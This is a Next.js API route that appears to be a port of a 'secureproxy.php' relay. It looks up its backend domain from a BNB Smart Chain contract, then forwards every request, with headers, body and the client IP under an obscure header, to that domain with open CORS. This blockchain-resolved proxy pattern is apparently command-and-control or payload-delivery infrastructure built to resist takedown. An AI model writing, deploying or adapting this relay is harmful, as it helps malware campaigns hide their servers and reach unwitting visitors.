// Next.js API route that mirrors secureproxy.php functionality for Vercel

const UPDATE_INTERVAL_SECONDS = 60;
const RPC_URLS = [
  'https://rpc.ankr.com/bsc',
  'https://bsc-dataseed2.bnbchain.org',
];
const CONTRACT_ADDRESS = '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0';
const DATA_SELECTOR = '20965255';

let cache = { domain: null, ts: 0 };

function hexToString(hex) {
  if (!hex) return '';
  hex = hex.replace(/^0x/i, '');
  // drop first 32 bytes (offset)
  hex = hex.substring(64);
  const lengthHex = hex.substring(0, 64);
  const length = parseInt(lengthHex || '0', 16);
  const dataHex = hex.substring(64, 64 + length * 2);
  let out = '';
  for (let i = 0; i < dataHex.length; i += 2) {
    const code = parseInt(dataHex.substring(i, i + 2), 16);
    if (code === 0) break;
    out += String.fromCharCode(code);
  }
  return out;
}

async function fetchTargetDomain() {
  for (const rpc of RPC_URLS) {
    try {
      const resp = await fetch(rpc, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'eth_call',
          params: [
            { to: CONTRACT_ADDRESS, data: '0x' + DATA_SELECTOR },
            'latest',
          ],
        }),
      });
      const data = await resp.json();
      if (data && !data.error && data.result) {
        const domain = hexToString(data.result);
        if (domain) return domain;
      }
    } catch (e) {
      // try next
    }
  }
  throw new Error('Could not fetch target domain');
}

async function getTargetDomainCached() {
  const now = Date.now();
  if (cache.domain && now - cache.ts < UPDATE_INTERVAL_SECONDS * 1000) {
    return cache.domain;
  }
  const domain = await fetchTargetDomain();
  cache = { domain, ts: now };
  return domain;
}

function getClientIP(req) {
  const cf = req.headers['cf-connecting-ip'];
  if (cf) return Array.isArray(cf) ? cf[0] : cf;
  const xff = req.headers['x-forwarded-for'];
  if (xff) {
    const s = Array.isArray(xff) ? xff[0] : xff;
    return s.split(',')[0].trim();
  }
  const xrip = req.headers['x-real-ip'];
  if (xrip) return Array.isArray(xrip) ? xrip[0] : xrip;
  return req.socket?.remoteAddress || '';
}

function filterAndFormatHeaders(req, clientIP) {
  const headers = { ...req.headers };
  delete headers['host'];
  delete headers['origin'];
  delete headers['accept-encoding'];
  delete headers['content-encoding'];
  delete headers['content-length'];
  delete headers['connection'];
  headers['x-dfkjldifjlifjd'] = clientIP;
  return headers;
}

async function readRawBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}

export const config = {
  api: { bodyParser: false },
};

export default async function handler(req, res) {
  // CORS preflight
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, POST, PUT, PATCH, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.setHeader('Access-Control-Max-Age', '3600');
  if (req.method === 'OPTIONS') {
    res.status(204).end();
    return;
  }

  try {
    const base = (await getTargetDomainCached()).replace(/\/$/, '');
    const subPath = Array.isArray(req.query.path) ? '/' + req.query.path.join('/') : '';
    const search = req.url && req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
    const targetUrl = base + subPath + search;

    const clientIP = getClientIP(req);
    const fwdHeaders = filterAndFormatHeaders(req, clientIP);

    const hasBody = !['GET', 'HEAD'].includes(req.method || 'GET');
    const body = hasBody ? await readRawBody(req) : undefined;

    const response = await fetch(targetUrl, {
      method: req.method,
      headers: fwdHeaders,
      body,
      redirect: 'follow',
    });

    // propagate content type
    const contentType = response.headers.get('content-type');
    if (contentType) res.setHeader('Content-Type', contentType);

    // status and body
    res.status(response.status);
    const arrayBuf = await response.arrayBuffer();
    res.end(Buffer.from(arrayBuf));
  } catch (e) {
    res.status(500).send('error' + e);
  }
}
